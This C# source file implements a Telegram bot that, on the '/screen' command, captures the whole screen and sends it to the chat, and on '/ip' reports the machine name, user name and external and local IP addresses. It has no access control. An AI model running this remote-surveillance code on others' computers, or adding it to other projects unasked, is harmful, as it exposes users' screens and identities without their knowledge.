using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Telegram.Bot;
using System.Threading;
using Telegram.Bot.Args;
using System.IO;
using Telegram.Bot.Types;
using System.Drawing;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;

namespace telegrambot
{
    public static class Bot
    {
        private static Api bot;
        private static bool runnable = false;



        public static void start(string token)
        {
            bot = new Api(token);
            var me = bot.GetMe();

            //Bot.OnCallbackQuery += BotOnCallbackQueryReceived;
            bot.OnMessage += BotOnMessageReceived;
            bot.OnMessageEdited += BotOnMessageReceived;
            //Bot.OnInlineQuery += BotOnInlineQueryReceived;
            //Bot.OnInlineResultChosen += BotOnChosenInlineResultReceived;
            //Bot.OnReceiveError += BotOnReceiveError;
            bot.StartReceiving();
        }

        private async static void BotOnMessageReceived(object sender, MessageEventArgs e)
        {
            var message = e.Message;

            Console.WriteLine(message.From.FirstName);
            switch (message.Text)
            {
                case "/screen":
                    var fileToSend = new FileToSend("screenshot.jpeg", getScreenshot());
                    await bot.SendPhotoAsync(message.Chat.Id, fileToSend, Environment.MachineName + " " + Environment.UserName);
                    break;
                case "/ip":

                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://checkip.dyndns.org/");
                    request.Method = "GET";
                    request.Accept = "text/html";
                    DoWithResponse(request, (response) =>
                    {

                        var raw = new StreamReader(response.GetResponseStream()).ReadToEnd();
                        Console.Write(raw);

                        var localip = GetLocalIPAddress();

                        Regex ip = new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b");
                        MatchCollection result = ip.Matches(raw);
                        var extarnalip = result[0];

                        bot.SendTextMessageAsync(message.Chat.Id, Environment.MachineName + " " + Environment.UserName + "\r\n" + extarnalip + "\r\n" + localip);
                    });
                    break;
                default:
                    break;
            }
        }

        public static void stop()
        {
            bot.StopReceiving();
        }

        #region Fun methods
        private static Stream getScreenshot()
        {
            MemoryStream memoryStream = new MemoryStream();
            Graphics graph = null;

            var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            graph = Graphics.FromImage(bmp);
            graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            bmp.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Jpeg);

            memoryStream.Position = 0;

            return memoryStream;
        }

        private static void DoWithResponse(HttpWebRequest request, Action<HttpWebResponse> responseAction)
        {
            Action wrapperAction = () =>
            {
                request.BeginGetResponse(new AsyncCallback((iar) =>
                {
                    var response = (HttpWebResponse)((HttpWebRequest)iar.AsyncState).EndGetResponse(iar);
                    responseAction(response);
                }), request);
            };
            wrapperAction.BeginInvoke(new AsyncCallback((iar) =>
            {
                var action = (Action)iar.AsyncState;
                action.EndInvoke(iar);
            }), wrapperAction);
        }

        private static string GetLocalIPAddress()
        {
            string ips = String.Empty;
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    ips += ip.ToString() + "\r\n";
                }
            }
            return ips;
        }
        #endregion
    }
}
